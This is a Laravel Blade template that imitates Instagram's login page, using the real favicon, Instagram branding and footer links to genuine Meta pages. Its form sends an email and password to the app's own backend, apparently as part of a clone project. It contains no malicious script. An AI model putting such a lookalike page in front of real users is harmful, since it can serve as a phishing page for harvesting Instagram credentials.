<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta http-equiv="X-UA-Compatible" content="ie=edge" />
        <title>Log in • Instagram</title>
        <link
            data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png"
            rel="icon"
            sizes="192x192"
            href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png"
        />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link
            href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
            rel="stylesheet"
        />
        <link
            href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
            rel="stylesheet"
        />
        <link
            href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap"
            rel="stylesheet"
        />
<link rel="stylesheet" href="{{ url('frontend/css/Login-Signup/login.css') }} ">
    </head>

    <body>
        <div class="container">
            <div class="log-in">
                <div class="mini-container">
                    <div>
                        <h1>Instagram</h1>
                        @if (session('error'))
                        <div style="color: red; text-align: center; font-size:13px;  margin-bottom: 10px;">
                            {{ session('error') }}
                        </div>
                    @endif
                        @if (session('success'))
                        <div style="color: rgb(31, 216, 31); text-align: center; font-size:13px;  margin-bottom: 10px;">
                            {{ session('success') }}
                        </div>
                    @endif

                        <form action="{{url('/')}}" method="post" autocomplete="off">
                            @csrf
                            <label class="email">
                                <input
                                    type="text"
                                    name="email"
                                    class="emailnumber"
                                    placeholder="Mobile Number or email address"
                                    required
                                />
                            </label>
                            <label class="password">
                                <input
                                    type="password"
                                    name="password"
                                    class="password"
                                    placeholder="Password"
                                    required
                                />
                            </label>
                            <button type="submit">
                                <p>Log in</p>
                            </button>
                        </form>
                        <div class="or-content">
                            <div class="left"></div>
                            <div class="or">
                                <p>OR</p>
                            </div>
                            <div class="right"></div>
                        </div>
                        <div class="log">
                            <a href="" id="fb-log">
                                <i class="bx bxl-facebook-square"></i> Log in
                                with Facebook</a
                            >
                            <a href="" id="forget">Forgotten your password?</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="sign-up">
                <p>
                    Don't have an account?
                    <a href="{{ url('/signup') }}">Sign up</a>
                </p>
            </div>

            <div class="get">
                <p>Get the app</p>
            </div>

            <div class="other-options">
                <div class="options">
                    <a href="https://about.meta.com/" target="_blank">Meta</a>
                    <a href="https://about.instagram.com/" target="_blank"
                        >About</a
                    >
                    <a href="https://about.instagram.com/blog" target="_blank"
                        >Blog</a
                    >
                    <a
                        href="https://about.instagram.com/about-us/careers"
                        target="_blank"
                        >Jobs</a
                    >
                    <a href="https://help.instagram.com/" target="_blank"
                        >Helps</a
                    >
                    <a
                        href="https://developers.facebook.com/docs/instagram"
                        target="_blank"
                        >API</a
                    >
                    <a
                        href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect"
                        target="_blank"
                        >Privacy</a
                    >
                    <a
                        href="https://help.instagram.com/581066165581870/"
                        target="_blank"
                        >Terms</a
                    >
                    <a
                        href="https://www.instagram.com/explore/locations/"
                        target="_blank"
                        >Locations</a
                    >
                    <a
                        href="https://www.instagram.com/web/lite/"
                        target="_blank"
                        >Instagram Lite</a
                    >
                    <a href="https://www.threads.net/" target="_blank"
                        >Threads</a
                    >
                    <a
                        href="https://www.facebook.com/help/instagram/261704639352628"
                        target="_blank"
                        >Contact uploading and non-users</a
                    >
                    <a
                        href="https://www.instagram.com/accounts/sign-up/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26__coig_login%3D1"
                        target="_blank"
                        >Meta Verfied</a
                    >
                </div>
                <div class="copyright">
                    <div class="form-group">
                        <label for=""></label>
                        <select class="form-control" name="" id="">
                            <option>English (UK)</option>
                            <option>Pakistan</option>
                            <option>China</option>
                        </select>
                    </div>
                    <p>© 2024 Instagram from Meta</p>
                </div>
            </div>
        </div>
    </body>
</html>
